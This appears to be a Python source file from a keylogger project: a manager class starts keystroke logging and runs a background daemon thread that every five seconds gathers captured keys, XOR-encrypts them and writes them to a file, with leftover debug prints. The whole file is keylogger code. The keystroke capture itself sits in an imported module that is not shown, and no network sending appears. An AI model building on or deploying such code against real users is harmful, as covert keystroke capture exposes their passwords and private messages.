import time
import threading
from KeyLoggerService import KeyLoggerService
import Writer
import Encryptor


class KeyLoggerManager:
    def __init__(self, file_name, key):
        self.keylogger = KeyLoggerService()
        self.writer = Writer.FileWriter(file_name)
        self.encryptor = Encryptor.Encryptor(key)
        self.running = False

    def collect_data(self):
        while self.running:
            time.sleep(5)
            data = ''.join(self.keylogger.get_logged_keys())
            print(data + ' from 19')
            if data != '':
                encrypted_data = self.encryptor.xor_encrypt(data)
                print(data + ' from 22')
                print(encrypted_data)
                self.writer.write_to_file(encrypted_data)
                self.keylogger.keys.clear()

    def start(self):
        self.running = True
        self.keylogger.start_logging()
        threading.Thread(target=self.collect_data, daemon=True).start()

    def stop(self):
        self.running = False
        self.keylogger.stop_logging()



